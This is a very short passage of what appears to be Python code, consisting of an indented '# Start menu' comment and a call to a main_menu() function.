         
         # Start menu
         main_menu()
